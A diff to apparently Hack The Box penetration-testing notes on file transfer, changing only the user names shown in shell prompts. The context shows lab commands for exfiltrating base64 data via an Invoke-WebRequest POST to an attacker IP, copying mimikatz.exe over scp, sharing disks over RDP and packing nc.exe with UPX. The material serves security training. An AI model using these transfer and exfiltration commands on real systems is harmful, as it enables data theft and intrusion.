@@ -79,7 +79,7 @@ PS C:\htb> Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
 After catching the base64 data with Netcat, the payload can be decoded.
 
 ```
-Waheed Nusrat@htb[/htb]$ echo <base64> | base64 -d -w 0 > bloodhound.zip
+htb[/htb]$ echo <base64> | base64 -d -w 0 > bloodhound.zip
 ```
 
 #### Bitsadmin
@@ -645,7 +645,7 @@ SCP Download
 ------------
 
 ```
-Waheed Nusrat@htb[/htb]$ scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
+htb[/htb]$ scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
 ```
 
 FTP
@@ -693,7 +693,7 @@ RDP
 Remote Desktop is often enabled on Windows machines, and from Linux, **rdesktop** can be used to expose a local folder in the remote RDP session.
 
 ```
-Waheed Nusrat@htb[/htb]$ rdesktop 10.10.10.132 -r disk:linux='/home/user/rdesktop/files'
+htb[/htb]$ rdesktop 10.10.10.132 -r disk:linux='/home/user/rdesktop/files'
 ```
 
 Alternatively, from Windows, the native mstsc.exe remote desktop client can be used.
@@ -714,7 +714,7 @@ On machines with a very stringent lockdown policy, it may be necessary to echo c
 Echo copying files is very inefficient and can result in a large amount of data being transferred across the clipboard, so we can use an executable packer such as [UPX](https://github.com/upx/upx/releases) to make the source file as small as possible.
 
 ```
-Waheed Nusrat@htb[/htb]$ upx --best nc.exe
+htb[/htb]$ upx --best nc.exe
 ```
 
 Next, we need to convert the binary data to base64. Windows contains a native utility that can do this - certutil.
